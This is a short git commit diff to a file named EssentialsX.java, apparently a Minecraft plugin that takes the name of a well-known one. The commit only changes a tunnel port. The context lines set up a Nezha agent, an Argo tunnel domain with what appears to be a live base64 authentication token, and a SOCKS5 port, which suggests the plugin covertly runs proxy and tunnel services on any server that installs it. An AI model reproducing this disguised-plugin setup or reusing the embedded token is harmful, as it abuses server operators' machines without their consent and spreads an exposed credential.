687731b4b06f37b18b7180d9e12f50961c883d9e
heyzone <harrywujy520@gmail.com>
2026-05-27 18:39:38 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -78,7 +78,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
+        env.put("ARGO_PORT", "18241");
         env.put("ARGO_DOMAIN", "mcserveruk.aser.cloudns.pro");
         env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiYjhkMWJhOTAtMWFmMS00MjNjLWFiOTMtMjYzYWE1MTg4MWRlIiwicyI6Ik1HWXpZekJsT0RZdE5USmtOQzAwWXpZMExUbG1OV1F0T1dZMlpUWmlZVE01WmpreiJ9");
         env.put("S5_PORT", "11387");
